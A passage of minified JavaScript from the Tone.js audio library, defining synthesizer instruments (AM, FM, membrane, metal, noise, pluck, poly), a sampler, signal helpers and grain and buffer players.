t.Signal(e.detune,t.Type.Cents),this.harmonicity=new t.Multiply(e.harmonicity),this.harmonicity.units=t.Type.Positive,this._modulationScale=new t.AudioToGain,this._modulationNode=new t.Gain,this.frequency.connect(this._carrier.frequency),this.frequency.chain(this.harmonicity,this._modulator.frequency),this.detune.fan(this._carrier.detune,this._modulator.detune),this._modulator.chain(this._modulationScale,this._modulationNode.gain),this._carrier.chain(this._modulationNode,this.output),this._readOnly(["frequency","harmonicity","oscillator","envelope","modulation","modulationEnvelope","detune"])},t.extend(t.AMSynth,t.Monophonic),t.AMSynth.defaults={harmonicity:3,detune:0,oscillator:{type:"sine"},envelope:{attack:.01,decay:.01,sustain:1,release:.5},modulation:{type:"square"},modulationEnvelope:{attack:.5,decay:0,sustain:1,release:.5}},t.AMSynth.prototype._triggerEnvelopeAttack=function(t,e){return t=this.toSeconds(t),this._carrier._triggerEnvelopeAttack(t,e),this._modulator._triggerEnvelopeAttack(t),this},t.AMSynth.prototype._triggerEnvelopeRelease=function(t){return this._carrier._triggerEnvelopeRelease(t),this._modulator._triggerEnvelopeRelease(t),this},t.AMSynth.prototype.dispose=function(){return t.Monophonic.prototype.dispose.call(this),this._writable(["frequency","harmonicity","oscillator","envelope","modulation","modulationEnvelope","detune"]),this._carrier.dispose(),this._carrier=null,this._modulator.dispose(),this._modulator=null,this.frequency.dispose(),this.frequency=null,this.detune.dispose(),this.detune=null,this.harmonicity.dispose(),this.harmonicity=null,this._modulationScale.dispose(),this._modulationScale=null,this._modulationNode.dispose(),this._modulationNode=null,this.oscillator=null,this.envelope=null,this.modulationEnvelope=null,this.modulation=null,this},t.AMSynth})),n((function(t){return t.MonoSynth=function(e){e=t.defaultArg(e,t.MonoSynth.defaults),t.Monophonic.call(this,e),this.oscillator=new t.OmniOscillator(e.oscillator),this.frequency=this.oscillator.frequency,this.detune=this.oscillator.detune,this.filter=new t.Filter(e.filter),this.filterEnvelope=new t.FrequencyEnvelope(e.filterEnvelope),this.envelope=new t.AmplitudeEnvelope(e.envelope),this.oscillator.chain(this.filter,this.envelope,this.output),this.filterEnvelope.connect(this.filter.frequency),this._readOnly(["oscillator","frequency","detune","filter","filterEnvelope","envelope"])},t.extend(t.MonoSynth,t.Monophonic),t.MonoSynth.defaults={frequency:"C4",detune:0,oscillator:{type:"square"},filter:{Q:6,type:"lowpass",rolloff:-24},envelope:{attack:.005,decay:.1,sustain:.9,release:1},filterEnvelope:{attack:.06,decay:.2,sustain:.5,release:2,baseFrequency:200,octaves:7,exponent:2}},t.MonoSynth.prototype._triggerEnvelopeAttack=function(t,e){return t=this.toSeconds(t),this.envelope.triggerAttack(t,e),this.filterEnvelope.triggerAttack(t),this.oscillator.start(t),0===this.envelope.sustain&&this.oscillator.stop(t+this.envelope.attack+this.envelope.decay),this},t.MonoSynth.prototype._triggerEnvelopeRelease=function(t){return this.envelope.triggerRelease(t),this.filterEnvelope.triggerRelease(t),this.oscillator.stop(t+this.envelope.release),this},t.MonoSynth.prototype.dispose=function(){return t.Monophonic.prototype.dispose.call(this),this._writable(["oscillator","frequency","detune","filter","filterEnvelope","envelope"]),this.oscillator.dispose(),this.oscillator=null,this.envelope.dispose(),this.envelope=null,this.filterEnvelope.dispose(),this.filterEnvelope=null,this.filter.dispose(),this.filter=null,this.frequency=null,this.detune=null,this},t.MonoSynth})),n((function(t){return t.DuoSynth=function(e){e=t.defaultArg(e,t.DuoSynth.defaults),t.Monophonic.call(this,e),this.voice0=new t.MonoSynth(e.voice0),this.voice0.volume.value=-10,this.voice1=new t.MonoSynth(e.voice1),this.voice1.volume.value=-10,this._vibrato=new t.LFO(e.vibratoRate,-50,50),this._vibrato.start(),this.vibratoRate=this._vibrato.frequency,this._vibratoGain=new t.Gain(e.vibratoAmount,t.Type.Positive),this.vibratoAmount=this._vibratoGain.gain,this.frequency=new t.Signal(440,t.Type.Frequency),this.harmonicity=new t.Multiply(e.harmonicity),this.harmonicity.units=t.Type.Positive,this.frequency.connect(this.voice0.frequency),this.frequency.chain(this.harmonicity,this.voice1.frequency),this._vibrato.connect(this._vibratoGain),this._vibratoGain.fan(this.voice0.detune,this.voice1.detune),this.voice0.connect(this.output),this.voice1.connect(this.output),this._readOnly(["voice0","voice1","frequency","vibratoAmount","vibratoRate"])},t.extend(t.DuoSynth,t.Monophonic),t.DuoSynth.defaults={vibratoAmount:.5,vibratoRate:5,harmonicity:1.5,voice0:{volume:-10,portamento:0,oscillator:{type:"sine"},filterEnvelope:{attack:.01,decay:0,sustain:1,release:.5},envelope:{attack:.01,decay:0,sustain:1,release:.5}},voice1:{volume:-10,portamento:0,oscillator:{type:"sine"},filterEnvelope:{attack:.01,decay:0,sustain:1,release:.5},envelope:{attack:.01,decay:0,sustain:1,release:.5}}},t.DuoSynth.prototype._triggerEnvelopeAttack=function(t,e){return t=this.toSeconds(t),this.voice0._triggerEnvelopeAttack(t,e),this.voice1._triggerEnvelopeAttack(t,e),this},t.DuoSynth.prototype._triggerEnvelopeRelease=function(t){return this.voice0._triggerEnvelopeRelease(t),this.voice1._triggerEnvelopeRelease(t),this},t.DuoSynth.prototype.getLevelAtTime=function(t){return(this.voice0.getLevelAtTime(t)+this.voice1.getLevelAtTime(t))/2},t.DuoSynth.prototype.dispose=function(){return t.Monophonic.prototype.dispose.call(this),this._writable(["voice0","voice1","frequency","vibratoAmount","vibratoRate"]),this.voice0.dispose(),this.voice0=null,this.voice1.dispose(),this.voice1=null,this.frequency.dispose(),this.frequency=null,this._vibratoGain.dispose(),this._vibratoGain=null,this._vibrato=null,this.harmonicity.dispose(),this.harmonicity=null,this.vibratoAmount.dispose(),this.vibratoAmount=null,this.vibratoRate=null,this},t.DuoSynth})),n((function(t){return t.FMSynth=function(e){e=t.defaultArg(e,t.FMSynth.defaults),t.Monophonic.call(this,e),this._carrier=new t.Synth(e.carrier),this._carrier.volume.value=-10,this.oscillator=this._carrier.oscillator,this.envelope=this._carrier.envelope.set(e.envelope),this._modulator=new t.Synth(e.modulator),this._modulator.volume.value=-10,this.modulation=this._modulator.oscillator.set(e.modulation),this.modulationEnvelope=this._modulator.envelope.set(e.modulationEnvelope),this.frequency=new t.Signal(440,t.Type.Frequency),this.detune=new t.Signal(e.detune,t.Type.Cents),this.harmonicity=new t.Multiply(e.harmonicity),this.harmonicity.units=t.Type.Positive,this.modulationIndex=new t.Multiply(e.modulationIndex),this.modulationIndex.units=t.Type.Positive,this._modulationNode=new t.Gain(0),this.frequency.connect(this._carrier.frequency),this.frequency.chain(this.harmonicity,this._modulator.frequency),this.frequency.chain(this.modulationIndex,this._modulationNode),this.detune.fan(this._carrier.detune,this._modulator.detune),this._modulator.connect(this._modulationNode.gain),this._modulationNode.connect(this._carrier.frequency),this._carrier.connect(this.output),this._readOnly(["frequency","harmonicity","modulationIndex","oscillator","envelope","modulation","modulationEnvelope","detune"])},t.extend(t.FMSynth,t.Monophonic),t.FMSynth.defaults={harmonicity:3,modulationIndex:10,detune:0,oscillator:{type:"sine"},envelope:{attack:.01,decay:.01,sustain:1,release:.5},modulation:{type:"square"},modulationEnvelope:{attack:.5,decay:0,sustain:1,release:.5}},t.FMSynth.prototype._triggerEnvelopeAttack=function(t,e){return t=this.toSeconds(t),this._carrier._triggerEnvelopeAttack(t,e),this._modulator._triggerEnvelopeAttack(t),this},t.FMSynth.prototype._triggerEnvelopeRelease=function(t){return t=this.toSeconds(t),this._carrier._triggerEnvelopeRelease(t),this._modulator._triggerEnvelopeRelease(t),this},t.FMSynth.prototype.dispose=function(){return t.Monophonic.prototype.dispose.call(this),this._writable(["frequency","harmonicity","modulationIndex","oscillator","envelope","modulation","modulationEnvelope","detune"]),this._carrier.dispose(),this._carrier=null,this._modulator.dispose(),this._modulator=null,this.frequency.dispose(),this.frequency=null,this.detune.dispose(),this.detune=null,this.modulationIndex.dispose(),this.modulationIndex=null,this.harmonicity.dispose(),this.harmonicity=null,this._modulationNode.dispose(),this._modulationNode=null,this.oscillator=null,this.envelope=null,this.modulationEnvelope=null,this.modulation=null,this},t.FMSynth})),n((function(t){return t.MembraneSynth=function(e){e=t.defaultArg(e,t.MembraneSynth.defaults),t.Instrument.call(this,e),this.oscillator=new t.OmniOscillator(e.oscillator),this.envelope=new t.AmplitudeEnvelope(e.envelope),this.octaves=e.octaves,this.pitchDecay=e.pitchDecay,this.oscillator.chain(this.envelope,this.output),this._readOnly(["oscillator","envelope"])},t.extend(t.MembraneSynth,t.Instrument),t.MembraneSynth.defaults={pitchDecay:.05,octaves:10,oscillator:{type:"sine"},envelope:{attack:.001,decay:.4,sustain:.01,release:1.4,attackCurve:"exponential"}},t.MembraneSynth.prototype.triggerAttack=function(t,e,n){e=this.toSeconds(e);var r=(t=this.toFrequency(t))*this.octaves;return this.oscillator.frequency.setValueAtTime(r,e),this.oscillator.frequency.exponentialRampToValueAtTime(t,e+this.toSeconds(this.pitchDecay)),this.envelope.triggerAttack(e,n),this.oscillator.start(e),this},t.MembraneSynth.prototype.triggerRelease=function(t){return t=this.toSeconds(t),this.envelope.triggerRelease(t),this.oscillator.stop(t+this.envelope.release),this},t.MembraneSynth.prototype.dispose=function(){return t.Instrument.prototype.dispose.call(this),this._writable(["oscillator","envelope"]),this.oscillator.dispose(),this.oscillator=null,this.envelope.dispose(),this.envelope=null,this},t.MembraneSynth})),n((function(t){var e=[1,1.483,1.932,2.546,2.63,3.897];return t.MetalSynth=function(n){n=t.defaultArg(n,t.MetalSynth.defaults),t.Instrument.call(this,n),this.frequency=new t.Signal(n.frequency,t.Type.Frequency),this._oscillators=[],this._freqMultipliers=[],this._amplitue=new t.Gain(0).connect(this.output),this._highpass=new t.Filter({type:"highpass",Q:-3.0102999566398125}).connect(this._amplitue),this._octaves=n.octaves,this._filterFreqScaler=new t.Scale(n.resonance,7e3),this.envelope=new t.Envelope({attack:n.envelope.attack,attackCurve:"linear",decay:n.envelope.decay,sustain:0,release:n.envelope.release}).chain(this._filterFreqScaler,this._highpass.frequency),this.envelope.connect(this._amplitue.gain);for(var r=0;r<e.length;r++){var i=new t.FMOscillator({type:"square",modulationType:"square",harmonicity:n.harmonicity,modulationIndex:n.modulationIndex});i.connect(this._highpass),this._oscillators[r]=i;var o=new t.Multiply(e[r]);this._freqMultipliers[r]=o,this.frequency.chain(o,i.frequency)}this.octaves=n.octaves},t.extend(t.MetalSynth,t.Instrument),t.MetalSynth.defaults={frequency:200,envelope:{attack:.001,decay:1.4,release:.2},harmonicity:5.1,modulationIndex:32,resonance:4e3,octaves:1.5},t.MetalSynth.prototype.triggerAttack=function(e,n){return e=this.toSeconds(e),n=t.defaultArg(n,1),this.envelope.triggerAttack(e,n),this._oscillators.forEach((function(t){t.start(e)})),0===this.envelope.sustain&&this._oscillators.forEach(function(t){t.stop(e+this.envelope.attack+this.envelope.decay)}.bind(this)),this},t.MetalSynth.prototype.triggerRelease=function(t){return t=this.toSeconds(t),this.envelope.triggerRelease(t),this._oscillators.forEach(function(e){e.stop(t+this.envelope.release)}.bind(this)),this},t.MetalSynth.prototype.sync=function(){return this._syncMethod("triggerAttack",0),this._syncMethod("triggerRelease",0),this},t.MetalSynth.prototype.triggerAttackRelease=function(t,e,n){return e=this.toSeconds(e),t=this.toSeconds(t),this.triggerAttack(e,n),this.triggerRelease(e+t),this},Object.defineProperty(t.MetalSynth.prototype,"modulationIndex",{get:function(){return this._oscillators[0].modulationIndex.value},set:function(t){for(var e=0;e<this._oscillators.length;e++)this._oscillators[e].modulationIndex.value=t}}),Object.defineProperty(t.MetalSynth.prototype,"harmonicity",{get:function(){return this._oscillators[0].harmonicity.value},set:function(t){for(var e=0;e<this._oscillators.length;e++)this._oscillators[e].harmonicity.value=t}}),Object.defineProperty(t.MetalSynth.prototype,"resonance",{get:function(){return this._filterFreqScaler.min},set:function(t){this._filterFreqScaler.min=t,this.octaves=this._octaves}}),Object.defineProperty(t.MetalSynth.prototype,"octaves",{get:function(){return this._octaves},set:function(t){this._octaves=t,this._filterFreqScaler.max=this._filterFreqScaler.min*Math.pow(2,t)}}),t.MetalSynth.prototype.dispose=function(){t.Instrument.prototype.dispose.call(this);for(var e=0;e<this._oscillators.length;e++)this._oscillators[e].dispose(),this._freqMultipliers[e].dispose();this._oscillators=null,this._freqMultipliers=null,this.frequency.dispose(),this.frequency=null,this._filterFreqScaler.dispose(),this._filterFreqScaler=null,this._amplitue.dispose(),this._amplitue=null,this.envelope.dispose(),this.envelope=null,this._highpass.dispose(),this._highpass=null},t.MetalSynth})),n((function(t){return t.NoiseSynth=function(e){e=t.defaultArg(e,t.NoiseSynth.defaults),t.Instrument.call(this,e),this.noise=new t.Noise,this.envelope=new t.AmplitudeEnvelope(e.envelope),this.noise.chain(this.envelope,this.output),this._readOnly(["noise","envelope"])},t.extend(t.NoiseSynth,t.Instrument),t.NoiseSynth.defaults={noise:{type:"white"},envelope:{attack:.005,decay:.1,sustain:0}},t.NoiseSynth.prototype.triggerAttack=function(t,e){return this.envelope.triggerAttack(t,e),this.noise.start(t),0===this.envelope.sustain&&this.noise.stop(t=this.envelope.attack+this.envelope.decay),this},t.NoiseSynth.prototype.triggerRelease=function(t){return this.envelope.triggerRelease(t),this.noise.stop(t+this.envelope.release),this},t.NoiseSynth.prototype.sync=function(){return this._syncMethod("triggerAttack",0),this._syncMethod("triggerRelease",0),this},t.NoiseSynth.prototype.triggerAttackRelease=function(t,e,n){return e=this.toSeconds(e),t=this.toSeconds(t),this.triggerAttack(e,n),this.triggerRelease(e+t),this},t.NoiseSynth.prototype.dispose=function(){return t.Instrument.prototype.dispose.call(this),this._writable(["noise","envelope"]),this.noise.dispose(),this.noise=null,this.envelope.dispose(),this.envelope=null,this},t.NoiseSynth})),n((function(t){return t.PluckSynth=function(e){e=t.defaultArg(e,t.PluckSynth.defaults),t.Instrument.call(this,e),this._noise=new t.Noise("pink"),this.attackNoise=e.attackNoise,this._lfcf=new t.LowpassCombFilter({resonance:e.resonance,dampening:e.dampening}),this.resonance=this._lfcf.resonance,this.dampening=this._lfcf.dampening,this._noise.connect(this._lfcf),this._lfcf.connect(this.output),this._readOnly(["resonance","dampening"])},t.extend(t.PluckSynth,t.Instrument),t.PluckSynth.defaults={attackNoise:1,dampening:4e3,resonance:.7},t.PluckSynth.prototype.triggerAttack=function(t,e){t=this.toFrequency(t),e=this.toSeconds(e);var n=1/t;return this._lfcf.delayTime.setValueAtTime(n,e),this._noise.start(e),this._noise.stop(e+n*this.attackNoise),this},t.PluckSynth.prototype.dispose=function(){return t.Instrument.prototype.dispose.call(this),this._noise.dispose(),this._lfcf.dispose(),this._noise=null,this._lfcf=null,this._writable(["resonance","dampening"]),this.dampening=null,this.resonance=null,this},t.PluckSynth})),n((function(t){return t.PolySynth=function(){var e=t.defaults(arguments,["polyphony","voice"],t.PolySynth);t.Instrument.call(this,e),(e=t.defaultArg(e,t.Instrument.defaults)).polyphony=Math.min(t.PolySynth.MAX_POLYPHONY,e.polyphony),this.voices=new Array(e.polyphony),this._triggers=new Array(e.polyphony),this.detune=new t.Signal(e.detune,t.Type.Cents),this._readOnly("detune");for(var n=0;n<e.polyphony;n++){var r=new e.voice(arguments[2],arguments[3]);if(!(r instanceof t.Monophonic))throw new Error("Synth constructor must be instance of Tone.Monophonic");this.voices[n]=r,r.connect(this.output),r.hasOwnProperty("detune")&&this.detune.connect(r.detune),this._triggers[n]={release:-1,note:null,voice:r}}},t.extend(t.PolySynth,t.Instrument),t.PolySynth.defaults={polyphony:4,volume:0,detune:0,voice:t.Synth},t.PolySynth.prototype.triggerAttack=function(t,e,n){Array.isArray(t)||(t=[t]),e=this.toSeconds(e);for(var r=0;r<t.length;r++){for(var i=t[r],o=this._triggers[0],s=1;s<this._triggers.length;s++)this._triggers[s].release<o.release&&(o=this._triggers[s]);o.release=1/0,o.note=JSON.stringify(i),o.voice.triggerAttack(i,e,n)}return this},t.PolySynth.prototype.triggerAttackRelease=function(e,n,r,i){if(r=this.toSeconds(r),this.triggerAttack(e,r,i),t.isArray(n)&&t.isArray(e))for(var o=0;o<e.length;o++){var s=n[Math.min(o,n.length-1)];this.triggerRelease(e[o],r+this.toSeconds(s))}else this.triggerRelease(e,r+this.toSeconds(n));return this},t.PolySynth.prototype.triggerRelease=function(t,e){Array.isArray(t)||(t=[t]),e=this.toSeconds(e);for(var n=0;n<t.length;n++)for(var r=JSON.stringify(t[n]),i=0;i<this._triggers.length;i++){var o=this._triggers[i];o.note===r&&o.release>e&&(o.voice.triggerRelease(e),o.release=e)}return this},t.PolySynth.prototype.sync=function(){return this._syncMethod("triggerAttack",1),this._syncMethod("triggerRelease",1),this},t.PolySynth.prototype.set=function(t,e,n){for(var r=0;r<this.voices.length;r++)this.voices[r].set(t,e,n);return this},t.PolySynth.prototype.get=function(t){return this.voices[0].get(t)},t.PolySynth.prototype.releaseAll=function(t){t=this.toSeconds(t);for(var e=0;e<this._triggers.length;e++){var n=this._triggers[e];n.release>t&&(n.release=t,n.voice.triggerRelease(t))}return this},t.PolySynth.prototype.dispose=function(){t.Instrument.prototype.dispose.call(this);for(var e=0;e<this.voices.length;e++)this.voices[e].dispose(),this.voices[e]=null;return this._writable("detune"),this.detune.dispose(),this.detune=null,this.voices=null,this._triggers=null,this},t.PolySynth.MAX_POLYPHONY=20,t.PolySynth})),n((function(t){return t.Sampler=function(e){var n=Array.prototype.slice.call(arguments);n.shift();var r=t.defaults(n,["onload","baseUrl"],t.Sampler);t.Instrument.call(this,r);var i={};for(var o in e)if(t.isNote(o)){var s=t.Frequency(o).toMidi();i[s]=e[o]}else{if(isNaN(parseFloat(o)))throw new Error("Tone.Sampler: url keys must be the note's pitch");i[o]=e[o]}this._buffers=new t.Buffers(i,r.onload,r.baseUrl),this._activeSources={},this.attack=r.attack,this.release=r.release},t.extend(t.Sampler,t.Instrument),t.Sampler.defaults={attack:0,release:.1,onload:t.noOp,baseUrl:""},t.Sampler.prototype._findClosest=function(t){for(var e=0;e<96;){if(this._buffers.has(t+e))return-e;if(this._buffers.has(t-e))return e;e++}return null},t.Sampler.prototype.triggerAttack=function(e,n,r){var i=t.Frequency(e).toMidi(),o=this._findClosest(i);if(null!==o){var s=i-o,a=this._buffers.get(s),u=new t.BufferSource({buffer:a,playbackRate:t.intervalToFrequencyRatio(o),fadeIn:this.attack,fadeOut:this.release,curve:"exponential"}).connect(this.output);u.start(n,0,a.duration,r),t.isArray(this._activeSources[i])||(this._activeSources[i]=[]),this._activeSources[i].push({note:i,source:u})}return this},t.Sampler.prototype.triggerRelease=function(e,n){var r=t.Frequency(e).toMidi();if(this._activeSources[r]&&this._activeSources[r].length){var i=this._activeSources[r].shift().source;n=this.toSeconds(n),i.stop(n+this.release,this.release)}return this},t.Sampler.prototype.releaseAll=function(t){for(var e in t=this.toSeconds(t),this._activeSources)for(var n=this._activeSources[e];n.length;)n.shift().source.stop(t+this.release,this.release);return this},t.Sampler.prototype.sync=function(){return this._syncMethod("triggerAttack",1),this._syncMethod("triggerRelease",1),this},t.Sampler.prototype.triggerAttackRelease=function(t,e,n,r){return n=this.toSeconds(n),e=this.toSeconds(e),this.triggerAttack(t,n,r),this.triggerRelease(t,n+e),this},t.Sampler.prototype.add=function(e,n,r){if(t.isNote(e)){var i=t.Frequency(e).toMidi();this._buffers.add(i,n,r)}else{if(isNaN(parseFloat(e)))throw new Error("Tone.Sampler: note must be the note's pitch. Instead got "+e);this._buffers.add(e,n,r)}},Object.defineProperty(t.Sampler.prototype,"loaded",{get:function(){return this._buffers.loaded}}),t.Sampler.prototype.dispose=function(){for(var e in t.Instrument.prototype.dispose.call(this),this._buffers.dispose(),this._buffers=null,this._activeSources)this._activeSources[e].forEach((function(t){t.source.dispose()}));return this._activeSources=null,this},t.Sampler})),n((function(t){t.supported&&(OscillatorNode.prototype.setPeriodicWave||(OscillatorNode.prototype.setPeriodicWave=OscillatorNode.prototype.setWaveTable),AudioContext.prototype.createPeriodicWave||(AudioContext.prototype.createPeriodicWave=AudioContext.prototype.createWaveTable))})),n((function(t){return t.GainToAudio=function(){t.SignalBase.call(this),this._norm=this.input=this.output=new t.WaveShaper((function(t){return 2*Math.abs(t)-1}))},t.extend(t.GainToAudio,t.SignalBase),t.GainToAudio.prototype.dispose=function(){return t.SignalBase.prototype.dispose.call(this),this._norm.dispose(),this._norm=null,this},t.GainToAudio})),n((function(t){return t.Normalize=function(e,n){t.SignalBase.call(this),this._inputMin=t.defaultArg(e,0),this._inputMax=t.defaultArg(n,1),this._sub=this.input=new t.Add(0),this._div=this.output=new t.Multiply(1),this._sub.connect(this._div),this._setRange()},t.extend(t.Normalize,t.SignalBase),Object.defineProperty(t.Normalize.prototype,"min",{get:function(){return this._inputMin},set:function(t){this._inputMin=t,this._setRange()}}),Object.defineProperty(t.Normalize.prototype,"max",{get:function(){return this._inputMax},set:function(t){this._inputMax=t,this._setRange()}}),t.Normalize.prototype._setRange=function(){this._sub.value=-this._inputMin,this._div.value=1/(this._inputMax-this._inputMin)},t.Normalize.prototype.dispose=function(){return t.SignalBase.prototype.dispose.call(this),this._sub.dispose(),this._sub=null,this._div.dispose(),this._div=null,this},t.Normalize})),n((function(t){return t.TransportTimelineSignal=function(){t.Signal.apply(this,arguments),this.output=this._outputSig=new t.Signal(this._initialValue),this._lastVal=this.value,this._synced=t.Transport.scheduleRepeat(this._onTick.bind(this),"1i"),this._bindAnchorValue=this._anchorValue.bind(this),t.Transport.on("start stop pause",this._bindAnchorValue),this._events.memory=1/0},t.extend(t.TransportTimelineSignal,t.Signal),t.TransportTimelineSignal.prototype._onTick=function(e){var n=this.getValueAtTime(t.Transport.seconds);this._lastVal!==n&&(this._lastVal=n,this._outputSig.linearRampToValueAtTime(n,e))},t.TransportTimelineSignal.prototype._anchorValue=function(e){var n=this.getValueAtTime(t.Transport.seconds);return this._lastVal=n,this._outputSig.cancelScheduledValues(e),this._outputSig.setValueAtTime(n,e),this},t.TransportTimelineSignal.prototype.getValueAtTime=function(e){return e=t.TransportTime(e),t.Signal.prototype.getValueAtTime.call(this,e)},t.TransportTimelineSignal.prototype.setValueAtTime=function(e,n){return n=t.TransportTime(n),t.Signal.prototype.setValueAtTime.call(this,e,n),this},t.TransportTimelineSignal.prototype.linearRampToValueAtTime=function(e,n){return n=t.TransportTime(n),t.Signal.prototype.linearRampToValueAtTime.call(this,e,n),this},t.TransportTimelineSignal.prototype.exponentialRampToValueAtTime=function(e,n){return n=t.TransportTime(n),t.Signal.prototype.exponentialRampToValueAtTime.call(this,e,n),this},t.TransportTimelineSignal.prototype.setTargetAtTime=function(e,n,r){return n=t.TransportTime(n),t.Signal.prototype.setTargetAtTime.call(this,e,n,r),this},t.TransportTimelineSignal.prototype.cancelScheduledValues=function(e){return e=t.TransportTime(e),t.Signal.prototype.cancelScheduledValues.call(this,e),this},t.TransportTimelineSignal.prototype.setValueCurveAtTime=function(e,n,r,i){return n=t.TransportTime(n),r=t.TransportTime(r),t.Signal.prototype.setValueCurveAtTime.call(this,e,n,r,i),this},t.TransportTimelineSignal.prototype.cancelAndHoldAtTime=function(e){return t.Signal.prototype.cancelAndHoldAtTime.call(this,t.TransportTime(e))},t.TransportTimelineSignal.prototype.dispose=function(){t.Transport.clear(this._synced),t.Transport.off("start stop pause",this._syncedCallback),this._events.cancel(0),t.Signal.prototype.dispose.call(this),this._outputSig.dispose(),this._outputSig=null},t.TransportTimelineSignal})),n((function(t){return t.GrainPlayer=function(){var e=t.defaults(arguments,["url","onload"],t.GrainPlayer);t.Source.call(this,e),this.buffer=new t.Buffer(e.url,e.onload),this._clock=new t.Clock(this._tick.bind(this),e.grainSize),this._loopStart=0,this._loopEnd=0,this._activeSources=[],this._playbackRate=e.playbackRate,this._grainSize=e.grainSize,this._overlap=e.overlap,this.detune=e.detune,this.overlap=e.overlap,this.loop=e.loop,this.playbackRate=e.playbackRate,this.grainSize=e.grainSize,this.loopStart=e.loopStart,this.loopEnd=e.loopEnd,this.reverse=e.reverse,this._clock.on("stop",this._onstop.bind(this))},t.extend(t.GrainPlayer,t.Source),t.GrainPlayer.defaults={onload:t.noOp,overlap:.1,grainSize:.2,playbackRate:1,detune:0,loop:!1,loopStart:0,loopEnd:0,reverse:!1},t.GrainPlayer.prototype._start=function(e,n,r){n=t.defaultArg(n,0),n=this.toSeconds(n),e=this.toSeconds(e),this._offset=n,this._clock.start(e),r&&this.stop(e+this.toSeconds(r))},t.GrainPlayer.prototype._stop=function(t){this._clock.stop(t)},t.GrainPlayer.prototype._onstop=function(t){this._activeSources.forEach((function(e){e.stop(t,0)}))},t.GrainPlayer.prototype._tick=function(e){var n=this._offset<this._overlap?0:this._overlap,r=new t.BufferSource({buffer:this.buffer,fadeIn:n,fadeOut:this._overlap,loop:this.loop,loopStart:this._loopStart,loopEnd:this._loopEnd,playbackRate:t.intervalToFrequencyRatio(this.detune/100)}).connect(this.output);r.start(e,this._offset),this._offset+=this.grainSize,r.stop(e+this.grainSize),this._activeSources.push(r),r.onended=function(){var t=this._activeSources.indexOf(r);-1!==t&&this._activeSources.splice(t,1)}.bind(this)},t.GrainPlayer.prototype.seek=function(t,e){return this._offset=this.toSeconds(t),this._tick(this.toSeconds(e)),this},Object.defineProperty(t.GrainPlayer.prototype,"playbackRate",{get:function(){return this._playbackRate},set:function(t){this._playbackRate=t,this.grainSize=this._grainSize}}),Object.defineProperty(t.GrainPlayer.prototype,"loopStart",{get:function(){return this._loopStart},set:function(t){this._loopStart=this.toSeconds(t)}}),Object.defineProperty(t.GrainPlayer.prototype,"loopEnd",{get:function(){return this._loopEnd},set:function(t){this._loopEnd=this.toSeconds(t)}}),Object.defineProperty(t.GrainPlayer.prototype,"reverse",{get:function(){return this.buffer.reverse},set:function(t){this.buffer.reverse=t}}),Object.defineProperty(t.GrainPlayer.prototype,"grainSize",{get:function(){return this._grainSize},set:function(t){this._grainSize=this.toSeconds(t),this._clock.frequency.value=this._playbackRate/this._grainSize}}),Object.defineProperty(t.GrainPlayer.prototype,"overlap",{get:function(){return this._overlap},set:function(t){this._overlap=this.toSeconds(t)}}),t.GrainPlayer.prototype.dispose=function(){return t.Source.prototype.dispose.call(this),this.buffer.dispose(),this.buffer=null,this._clock.dispose(),this._clock=null,this._activeSources.forEach((function(t){t.dispose()})),this._activeSources=null,this},t.GrainPlayer})),n((function(t){return t.Player=function(e){var n;e instanceof t.Buffer&&e.loaded?(e=e.get(),n=t.Player.defaults):n=t.defaults(arguments,["url","onload"],t.Player),t.Source.call(this,n),this.autostart=n.autostart,this._buffer=new t.Buffer({url:n.url,onload:this._onload.bind(this,n.onload),reverse:n.reverse}),e instanceof AudioBuffer&&this._buffer.set(e),this._loop=n.loop,this._loopStart=n.loopStart,this._loopEnd=n.loopEnd,this._playbackRate=n.playbackRate,this._activeSources=[],this._elapsedTime=new t.TickSource(n.playbackRate),this.fadeIn=n.fadeIn,this.fadeOut=n.fadeOut},t.extend(t.Player,t.Source),t.Player.defaults={onload:t.noOp,playbackRate:1,loop:!1,autostart:!1,loopStart:0,loopEnd:0,retrigger:!1,reverse:!1,fadeIn:0,fadeOut:0},t.Player.prototype.load=function(t,e){return this._buffer.load(t,this._onload.bind(this,e))},t.Player.prototype._onload=function(e){(e=t.defaultArg(e,t.noOp))(this),this.autostart&&this.start()},t.Player.prototype._onSourceEnd=function(t){var e=this._activeSources.indexOf(t);this._activeSources.splice(e,1)},t.Player.prototype._start=function(e,n,r){n=this._loop?t.defaultArg(n,this._loopStart):t.defaultArg(n,0),n=this.toSeconds(n);var i=t.defaultArg(r,Math.max(this._buffer.duration-n,0));i=this.toSeconds(i),e=this.toSeconds(e),this._elapsedTime.start(e,n);var o=new t.BufferSource({buffer:this._buffer,loop:this._loop,loopStart:this._loopStart,loopEnd:this._loopEnd,onended:this._onSourceEnd.bind(this),playbackRate:this._playbackRate,fadeIn:this.fadeIn,fadeOut:this.fadeOut}).connect(this.output);return this._loop||this._synced||this._state.setStateAtTime(t.State.Stopped,e+i/this._playbackRate),this._activeSources.push(o),this._loop&&t.isUndef(r)?o.start(e,n):o.start(e,n,i),this},t.Player.prototype._stop=function(t){return t=this.toSeconds(t),this._elapsedTime.stop(t),this._activeSources.forEach((function(e){e.stop(t)})),this},t.Player.prototype.restart=function(t,e,n){return this._stop(t),this._start(t,e,n),this},t.Player.prototype.seek=function(e,n){return n=this.toSeconds(n),this._state.getValueAtTime(n)===t.State.Started&&(e=this.toSeconds(e),this._stop(n),this._start(n,e)),this},t.Player.prototype.setLoopPoints=function(t,e){return this.loopStart=t,this.loopEnd=e,this},Object.defineProperty(t.Player.prototype,"loopStart",{get:function(){return this._loopStart},set:function(t){this._loopStart=t,this._activeSources.forEach((function(e){e.loopStart=t}))}}),Object.defineProperty(t.Player.prototype,"loopEnd",{get:function(){return this._loopEnd},set:function(t){this._loopEnd=t,this._activeSources.forEach((function(e){e.loopEnd=t}))}}),Object.defineProperty(t.Player.prototype,"buffer",{get:function(){return this._buffer},set:function(t){this._buffer.set(t)}}),Object.defineProperty(t.Player.prototype,"loop",{get:function(){return this._loop},set:function(e){if(this._loop!==e){this._loop=e;var n=this.now();if(e){var r=this._state.getNextState(t.State.Stopped,n);r&&(this._activeSources.forEach((function(t){t.loop=e})),this._state.cancel(r.time),this._elapsedTime.cancel(r.time))}else this._stopAtNextIteration(n)}}}),t.Player.prototype._stopAtNextIteration=function(e){if(this._state.getValueAtTime(e)===t.State.Started){var n=this._state.getNextState(t.State.Stopped,e),r=this._elapsedTime.getTicksAtTime(e),i=Math.max(Math.ceil(r/this.buffer.duration),1),o=this._elapsedTime.getTimeOfTick(i*this.buffer.duration,n?n.time-this.sampleTime:1/0);this.stop(o)}},Object.defineProperty(t.Player.prototype,"playbackRate",{get:function(){return 